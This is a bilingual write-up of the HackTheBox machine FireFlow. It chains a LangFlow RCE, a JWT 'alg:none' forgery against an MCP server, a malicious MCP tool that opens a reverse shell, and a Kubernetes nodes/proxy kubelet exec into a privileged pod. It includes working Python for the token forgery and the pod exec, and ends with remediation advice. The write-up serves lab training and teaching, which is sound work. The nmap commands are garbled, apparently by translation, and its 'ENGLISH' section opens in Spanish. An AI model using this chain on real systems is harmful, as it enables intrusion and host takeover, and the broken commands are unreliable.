![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*x7cFAOPNJPvbfUPpTu3ZgA.png)

## ENGLISH

**Máquina:** FireFlow (HackTheBox) — dificultad Media

Este artículo cubre el compromiso completo de FireFlow, desde el reconocimiento inicial hasta la raíz, encadenando un RCE no autenticado en una instancia de LangFlow auto-alojada, un JWT `alg:none` Falsificación contra un servidor MCP (Model Context Protocol) mal configurado, y un escape de cápsula privilegiada de Kubernetes para obtener root en el host subyacente.

## 1\. Reconocimiento

Empecé con un escaneo completo del puerto TCP para identificar cada puerto abierto y versión de servicio.

```cs
nmap - p ---open -sS --min-rate 50005000 -vvv -n -Pn -oG Puertos -oN Puertos 10.129.73.28
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uN7Kn7RDelTNAs65sPjIUA.png)

Con los puertos abiertos identificados, ejecuté un servicio/exploración de versión dirigida contra ellos:

```cs
nmap -p22.443 -sCV 10.129.73.28 - en Vports
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tuS7uEDUSFC5UmonIkRdCg.png)

Only two ports were open: **22 (SSH)** and **443 (HTTPS)**.

## 2\. Enumeration

Since only SSH and HTTPS were exposed, I focused on the web service. Browsing to the HTTPS endpoint revealed a subdomain hosting a **LangFlow** instance — an open-source visual builder for LLM-powered applications.

The LangFlow version was disclosed at the bottom of the main page:

That version is affected by **CVE-2026–33017**, a critical **unauthenticated remote code execution (RCE)** vulnerability in LangFlow. The flaw allows an unauthenticated attacker to execute arbitrary Python code on the server, because LangFlow’s flow-execution API does not enforce authentication on the endpoint that evaluates custom component code.

## 3\. Exploitation

I used a public proof-of-concept ([PoC](https://github.com/EQSTLab/CVE-2026-33017)) for CVE-2026–33017 and adapted it to target an HTTPS endpoint — the original PoC assumed plain HTTP, so I added TLS support (`verify=False`) inside the `send_payload()` function to point it at the HTTPS subdomain.

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Ym8nvDk1Nid048J_F9xXA.png)

Running the modified script confirmed code execution on the target:

**Root cause:** LangFlow exposes an API endpoint that lets a client submit and execute a custom “flow” component without any authentication check. Since these components can contain arbitrary Python, an unauthenticated request is enough to achieve full RCE.

Enumerating the filesystem from my RCE foothold, I found a `.env` file containing credentials for the user `<username>`:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PCTUuWMeZjAi40AypxN5rA.png)

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bNt27noR_zlFpo3Ag8UOtg.png)

I used these credentials to authenticate over SSH and obtained a shell as “nightfall”:

![](https://miro.medium.com/v2/resize:fit:1336/format:webp/1*8N_GSDgdejlnlEO9Z6om1Q.png)

While looking for a privilege escalation path, I found a `config.json` file inside a `.mcp` directory in the user's home folder:

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*HEY96bh5Xe_ogPjS1Xdovw.png)

The directory name (`.mcp`) and the structure of the configuration file indicated that the host was also running an **MCP (Model Context Protocol) server** — a service that exposes "tools" (callable functions) to AI agents over an HTTP API.

## Get PELURED’s stories in your inbox

Join Medium for free to get updates from this writer.

Querying the service with `curl` returned its version banner and additional endpoint details:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8_pwIq5MuTEV1FnKbsVwHg.png)

Sending a `POST` request to the `/auth` endpoint returned a valid access token:

Decoding the token showed it was a standard JWT:

The MCP configuration file revealed that at least one endpoint required the `admin` role to be reachable — but the token I had obtained only carried a low-privileged role.

Because the server’s JWT verification logic did not explicitly reject the `none` algorithm, I crafted an unsigned token asserting the `admin` role:

```cs
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sYkpOfGDaMCbyga7Ml3GNQ.png)

**Root cause:** The JWT specification allows `alg: none` as a valid (unsigned) algorithm for cases where integrity is verified through other means. Many JWT libraries will happily parse and trust an unsigned token if the server does not explicitly whitelist the accepted algorithms. Here, the MCP server accepted the forged token as authentic and granted it `admin` privileges, meaning authentication was effectively bypassable simply by asserting the desired role in the payload.

With this forged admin token, I registered a malicious MCP “tool” whose implementation executed an arbitrary system command (a reverse shell) whenever invoked:

I set up a listener on my attacking machine and triggered the reverse shell by invoking the malicious tool through the MCP API:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oLl4XPnKWN1oZd_ftuXVxA.png)

This returned a shell as the `mcp` user:

## 4\. Privilege Escalation

Enumerating the new environment as `mcp`, several indicators (mount points, environment variables, service account tokens) suggested I was running inside a **Kubernetes pod**. I confirmed this with:

```cs
env | grep KUBERNETES
```

To determine what the pod’s service account was authorized to do, I sent a `POST` request to the Kubernetes API's `SelfSubjectRulesReview` endpoint:

```cs
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"  -H "Content-Type: application/json"  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ss5DFnMIhj_Qs7HC-PFq2A.png)

The response showed the service account held the `nodes/proxy` permission. This is a highly sensitive permission: it allows a client to send arbitrary requests to the **kubelet API** on any node in the cluster, including endpoints that can execute commands inside any pod running on that node — effectively enabling cluster-wide code execution from a single compromised service account.

I then searched the cluster for a **privileged pod** to pivot into:

I found a privileged pod configured with `hostPath` mounts of `/proc`, `/sys`, and `/` — meaning the entire host filesystem was mounted directly inside the pod. Combined with the `nodes/proxy` permission, this gave a direct path to host-level code execution.

Using the `nodes/proxy` permission, I wrote a script to execute commands inside the privileged pod via the kubelet API, which in turn let me interact with the mounted host filesystem:

```cs
#!/usr/bin/env python3

import asyncio
import ssl
import sys
import websockets

NODE = "10.129.80.198"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def run_command(command, output_file=None):
    query = "&".join(f"command={word}" for word in command.split())
    url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{query}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    output = []
    try:
        async with websockets.connect(
            url,
            ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
        ) as ws:
            print(f"[+] Ejecutando: {command}")
            async for msg in ws:
                decoded = msg[1:].decode(errors="replace")
                output.append(decoded)
                if not output_file:
                    sys.stdout.write(decoded)
                    sys.stdout.flush()

        if output_file:
            with open(output_file, 'w') as f:
                f.write(''.join(output))
            print(f"[+] Output guardado en: {output_file}")

        return ''.join(output)

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    # Por defecto ejecuta cat /root/root/root.txt
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
    
    # Si se pasa un segundo argumento, lo usa como archivo de salida
    output = sys.argv[2] if len(sys.argv) > 2 else None
    
    asyncio.run(run_command(cmd, output))
```
```cs
python3 script.py
```
![](https://miro.medium.com/v2/resize:fit:1302/format:webp/1*B_bzejRM-PCAK-LXA-_j4Q.png)

**Root cause:** The service account bound to the `mcp` pod was over-privileged, holding `nodes/proxy` rights it did not need. Combined with an unrelated privileged pod that mounted the host's root filesystem, this allowed full container breakout and host compromise — a classic case of excessive RBAC permissions plus insecure pod security context compounding into a critical escalation path.

## Remediation

- **LangFlow RCE:** Upgrade to a patched LangFlow release and ensure the flow-execution API requires authentication; do not expose LangFlow admin interfaces on public-facing subdomains.
- **Credential hygiene:** Do not store plaintext credentials in `.env` files reachable from a web application's execution context; use a secrets manager and restrict file permissions.
- **JWT** `**alg:none**`**:** Explicitly whitelist accepted signing algorithms (e.g., `RS256`, `HS256`) in the JWT verification library and reject any token asserting `alg: none`.
- **MCP tool registration:** Restrict who can register new tools; treat tool registration as a privileged, auditable action, and sandbox tool execution.
- **Kubernetes RBAC:** Apply least privilege to service accounts — `nodes/proxy` should never be granted to workload pods unless strictly required. Avoid `hostPath` mounts of `/`, `/proc`, or `/sys` in any pod; use Pod Security Admission/Standards to block privileged pods by default.
![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*x7cFAOPNJPvbfUPpTu3ZgA.png)

## ESPAÑOL

**Máquina:** FireFlow (HackTheBox) — dificultad Media

Este artículo cubre el compromiso completo de FireFlow, desde el reconocimiento inicial hasta root, encadenando un RCE no autenticado en una instancia de LangFlow autoalojada, una falsificación JWT `alg:none` contra un servidor MCP (Model Context Protocol) mal configurado, y un escape de un pod privilegiado de Kubernetes para obtener root en el host subyacente.

## 1. Reconocimiento

Empecé con un escaneo completo de puertos TCP para identificar cada puerto abierto y su versión de servicio.

```cs
nmap - p ---open -sS --min-rate 50005000 -vvv -n -Pn -oG Puertos -oN Puertos 10.129.73.28
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uN7Kn7RDelTNAs65sPjIUA.png)

Con los puertos abiertos identificados, ejecuté un escaneo dirigido de servicios/versiones contra ellos:

```cs
nmap -p22.443 -sCV 10.129.73.28 - en Vports
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tuS7uEDUSFC5UmonIkRdCg.png)

Solo había dos puertos abiertos: **22 (SSH)** y **443 (HTTPS)**.

## 2. Enumeración

Dado que solo SSH y HTTPS estaban expuestos, me centré en el servicio web. Al navegar al endpoint HTTPS descubrí un subdominio que alojaba una instancia de **LangFlow** — un constructor visual de código abierto para aplicaciones basadas en LLM.

La versión de LangFlow se mostraba en la parte inferior de la página principal:

Esa versión está afectada por **CVE-2026-33017**, una vulnerabilidad crítica de **ejecución remota de código (RCE) no autenticada** en LangFlow. El fallo permite a un atacante no autenticado ejecutar código Python arbitrario en el servidor, porque la API de ejecución de flujos de LangFlow no aplica autenticación en el endpoint que evalúa el código de los componentes personalizados.

## 3. Explotación

Utilicé una prueba de concepto pública ([PoC](https://github.com/EQSTLab/CVE-2026-33017)) para CVE-2026-33017 y la adapté para atacar un endpoint HTTPS — el PoC original asumía HTTP plano, así que añadí soporte TLS (`verify=False`) dentro de la función `send_payload()` para apuntarla al subdominio HTTPS.

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Ym8nvDk1Nid048J_F9xXA.png)

Al ejecutar el script modificado confirmé la ejecución de código en el objetivo:

**Causa raíz:** LangFlow expone un endpoint API que permite a un cliente enviar y ejecutar un componente de “flujo” personalizado sin ninguna comprobación de autenticación. Dado que estos componentes pueden contener Python arbitrario, una petición no autenticada basta para lograr un RCE completo.

Enumerando el sistema de archivos desde mi punto de apoyo con RCE, encontré un archivo `.env` que contenía credenciales para el usuario `<username>`:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PCTUuWMeZjAi40AypxN5rA.png)

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bNt27noR_zlFpo3Ag8UOtg.png)

Usé estas credenciales para autenticarme por SSH y obtuve una shell como “nightfall”:

![](https://miro.medium.com/v2/resize:fit:1336/format:webp/1*8N_GSDgdejlnlEO9Z6om1Q.png)

Mientras buscaba una vía de escalada de privilegios, encontré un archivo `config.json` dentro de un directorio `.mcp` en la carpeta personal del usuario:

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*HEY96bh5Xe_ogPjS1Xdovw.png)

El nombre del directorio (`.mcp`) y la estructura del archivo de configuración indicaban que el host también estaba ejecutando un **servidor MCP (Model Context Protocol)** — un servicio que expone "herramientas" (funciones invocables) a agentes de IA a través de una API HTTP.

## Recibe las historias de PELURED en tu bandeja de entrada

Únete a Medium gratis para recibir novedades de este autor.

Al consultar el servicio con `curl` obtuve su banner de versión y detalles adicionales de los endpoints:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8_pwIq5MuTEV1FnKbsVwHg.png)

Enviar una petición `POST` al endpoint `/auth` devolvió un token de acceso válido:

Al decodificar el token se observó que era un JWT estándar:

El archivo de configuración de MCP revelaba que al menos un endpoint requería el rol `admin` para ser accesible — pero el token que había obtenido solo tenía un rol de bajo privilegio.

Dado que la lógica de verificación JWT del servidor no rechazaba explícitamente el algoritmo `none`, fabriqué un token sin firmar afirmando el rol `admin`:

```cs
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sYkpOfGDaMCbyga7Ml3GNQ.png)

**Causa raíz:** La especificación JWT permite `alg: none` como algoritmo válido (sin firma) para casos en los que la integridad se verifica por otros medios. Muchas librerías JWT aceptarán y confiarán en un token sin firmar si el servidor no incluye explícitamente en lista blanca los algoritmos aceptados. Aquí, el servidor MCP aceptó el token falsificado como auténtico y le otorgó privilegios de `admin`, lo que significa que la autenticación podía eludirse por completo simplemente afirmando el rol deseado en el payload.

Con este token de admin falsificado, registré una “herramienta” MCP maliciosa cuya implementación ejecutaba un comando arbitrario del sistema (una reverse shell) cada vez que se invocaba:

Configuré un listener en mi máquina atacante y activé la reverse shell invocando la herramienta maliciosa a través de la API de MCP:

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oLl4XPnKWN1oZd_ftuXVxA.png)

Esto me devolvió una shell como el usuario `mcp`:

## 4. Escalada de privilegios

Al enumerar el nuevo entorno como `mcp`, varios indicadores (puntos de montaje, variables de entorno, tokens de cuentas de servicio) sugerían que estaba ejecutándose dentro de un **pod de Kubernetes**. Lo confirmé con:

```cs
env | grep KUBERNETES
```

Para determinar qué podía hacer la cuenta de servicio del pod, envié una petición `POST` al endpoint `SelfSubjectRulesReview` de la API de Kubernetes:

```cs
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"  -H "Content-Type: application/json"  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```
![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ss5DFnMIhj_Qs7HC-PFq2A.png)

La respuesta mostró que la cuenta de servicio tenía el permiso `nodes/proxy`. Este es un permiso altamente sensible: permite a un cliente enviar peticiones arbitrarias a la **API del kubelet** en cualquier nodo del clúster, incluyendo endpoints que pueden ejecutar comandos dentro de cualquier pod que se ejecute en ese nodo — lo que en la práctica permite la ejecución de código en todo el clúster desde una sola cuenta de servicio comprometida.

Luego busqué en el clúster un **pod privilegiado** al que pivotar:

Encontré un pod privilegiado configurado con montajes `hostPath` de `/proc`, `/sys` y `/` — lo que significa que todo el sistema de archivos del host estaba montado directamente dentro del pod. Combinado con el permiso `nodes/proxy`, esto proporcionaba una vía directa a la ejecución de código a nivel de host.

Usando el permiso `nodes/proxy`, escribí un script para ejecutar comandos dentro del pod privilegiado a través de la API del kubelet, lo que a su vez me permitió interactuar con el sistema de archivos del host montado:

```cs
#!/usr/bin/env python3

import asyncio
import ssl
import sys
import websockets

NODE = "10.129.80.198"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def run_command(command, output_file=None):
    query = "&".join(f"command={word}" for word in command.split())
    url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{query}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    output = []
    try:
        async with websockets.connect(
            url,
            ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
        ) as ws:
            print(f"[+] Ejecutando: {command}")
            async for msg in ws:
                decoded = msg[1:].decode(errors="replace")
                output.append(decoded)
                if not output_file:
                    sys.stdout.write(decoded)
                    sys.stdout.flush()

        if output_file:
            with open(output_file, 'w') as f:
                f.write(''.join(output))
            print(f"[+] Output guardado en: {output_file}")

        return ''.join(output)

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    # Por defecto ejecuta cat /root/root/root.txt
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
    
    # Si se pasa un segundo argumento, lo usa como archivo de salida
    output = sys.argv[2] if len(sys.argv) > 2 else None
    
    asyncio.run(run_command(cmd, output))
```
```cs
python3 script.py
```
![](https://miro.medium.com/v2/resize:fit:1302/format:webp/1*B_bzejRM-PCAK-LXA-_j4Q.png)

**Causa raíz:** La cuenta de servicio vinculada al pod `mcp` tenía privilegios excesivos, con derechos `nodes/proxy` que no necesitaba. Combinado con un pod privilegiado no relacionado que montaba el sistema de archivos raíz del host, esto permitió una evasión completa del contenedor y el compromiso del host — un caso clásico en el que permisos RBAC excesivos más un contexto de seguridad de pod inseguro se combinan en una vía crítica de escalada.

## Remediación

- **RCE en LangFlow:** Actualizar a una versión parcheada de LangFlow y asegurarse de que la API de ejecución de flujos requiera autenticación; no exponer las interfaces de administración de LangFlow en subdominios públicos.
- **Higiene de credenciales:** No almacenar credenciales en texto plano en archivos `.env` accesibles desde el contexto de ejecución de una aplicación web; usar un gestor de secretos y restringir los permisos de los archivos.
- **JWT** `**alg:none**`**:** Incluir explícitamente en lista blanca los algoritmos de firma aceptados (p. ej., `RS256`, `HS256`) en la librería de verificación JWT y rechazar cualquier token que afirme `alg: none`.
- **Registro de herramientas MCP:** Restringir quién puede registrar nuevas herramientas; tratar el registro de herramientas como una acción privilegiada y auditable, y aislar (sandbox) la ejecución de herramientas.
- **RBAC en Kubernetes:** Aplicar el principio de mínimo privilegio a las cuentas de servicio — `nodes/proxy` nunca debería otorgarse a pods de carga de trabajo salvo que sea estrictamente necesario. Evitar montajes `hostPath` de `/`, `/proc` o `/sys` en cualquier pod; usar Pod Security Admission/Standards para bloquear pods privilegiados por defecto.
